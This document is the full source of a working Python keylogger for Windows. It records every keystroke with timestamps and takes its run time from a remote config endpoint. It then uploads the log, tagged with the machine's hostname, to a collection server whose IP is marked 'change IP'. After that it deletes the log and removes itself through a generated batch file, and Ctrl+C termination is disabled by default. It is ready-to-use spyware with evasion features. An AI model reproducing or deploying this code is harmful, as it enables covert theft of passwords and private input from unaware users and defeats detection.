import keyboard          # Captures keystrokes
from datetime import datetime  # For timestamping logs
import os                # File and path operations
import requests          # Sends HTTP requests to server
import threading         # Manages timer in a separate thread
import socket            # Gets hostname for identification
import time              # Adds delays (e.g., retry logic)
import sys               # Accesses script filename for self-deletion
import subprocess        # Runs batch file for self-destruction

config_url = "http://127.0.0.1:1111/config" #change IP

hostname = socket.gethostname()
timestamp = datetime.now().strftime("%d-%m-%Y-%H%M%S")
logFilename = f"{hostname}_{timestamp}.txt"

def get_timer():
    '''
    Attempts to retrieve a timer value from `config_url`. Retries up to three times on failure.

    Returns:
        int: The timer value from the server, or 300 if all attempts fail.
    '''
    for attempt in range(3):
        try:
            response = requests.get(config_url)
            if response.status_code == 200:
                return int(response.text.strip())
            else:
                print("failed to set timer")
        except Exception as e:
            print(f"An error occurred: {e}")
        time.sleep(2)
    return 300

timer = get_timer()

def printkey(key):
    '''
    Logs a keystroke to a file with a timestamp.

    Args:
        key: The key event to log, containing the name of the key pressed.
    
    Writes:
        Appends the timestamped keystroke to 'logFilename'.
    '''
    timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    with open(logFilename, 'a') as f:
        f.write(f"[{timestamp}] --> {key.name}\n")

def upload_file():
    """
    Uploads the log file to a remote server and deletes it locally upon successful upload.

    Sends:
        POST request to the server with the log file (`logFilename`) and hostname as form data.

    Prints:
        Success message if the upload is completed and the file is deleted.
        Error message if the upload fails or if file deletion encounters an exception.
    """
    url = "http://127.0.0.1:1111/upload" #change IP
    with open(logFilename, "rb") as f:
        files = {'file': f}
        data = {'hostname': hostname}
        response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print("File uploaded successfully")
        try:
            os.remove(logFilename)
        except Exception as e:
            print(f"Failed to delete file: {e}")
    else:
        print(f"Failed to upload file: {response.status_code}")

def timer_end():
    """
    Ends the timer by uploading the log file and performing optional self-destruction.

    Actions:
        Calls `upload_file` to upload the log file to the server.
        Calls `self_destruct` to delete the script if `destroy` is set to True.
        Exits the program.
    """
    upload_file()
    if destroy == True:
        self_destruct()
    os._exit(0)

destroy = True #change to False to prevent self destruct

def self_destruct():
    """
    Deletes the log file and initiates self-deletion of the script using a batch file.

    Actions:
        - Deletes the log file (`logFilename`) if it exists.
        - Creates and runs a batch file (`self_destruct.bat`) to delete the script file (`script_file`)
          after the script exits, with a 2-second delay to ensure the script has fully terminated.
        - The batch file deletes itself after removing the script.

    Prints:
        - Confirmation messages for successful or failed deletion of the log file.
        - "Self-destruct sequence initiated" when the batch file is created and executed.
    """
    path = os.getcwd()
    log_file = os.path.join(path, logFilename)
    script_file = sys.argv[0]
    if os.path.exists(log_file):
        try:
            os.remove(log_file)
            print(f"Log file '{log_file}' deleted successfully.")
        except Exception as e:
            print(f"Failed to delete log file '{log_file}': {e}")
    else:
        print("Log file not found for deletion.")
    
    batch_filename = "self_destruct.bat"
    with open(batch_filename, "w") as batch_file:
        batch_file.write(f"@echo off\n")
        batch_file.write(f"timeout /t 2 >nul\n")  # Wait for 2 seconds to allow the script to exit
        batch_file.write(f"del \"{script_file}\"\n")  # Delete the executable
        batch_file.write(f"del \"%~f0\"")
    subprocess.Popen(batch_filename, shell=True)
    print("Self-destruct sequence initiated.")

keyboard.on_press(printkey)

timer_thread = threading.Timer(timer, timer_end)
timer_thread.start()

allowTermination = False #change to True to terminate the script with CTRL+C

try:
    keyboard.wait()
except KeyboardInterrupt:
    if allowTermination:
        print("Keylogging stopped manually")
        timer_thread.cancel()
        upload_file()
        if destroy == True:
            self_destruct()
        os._exit(0)
    else:
        pass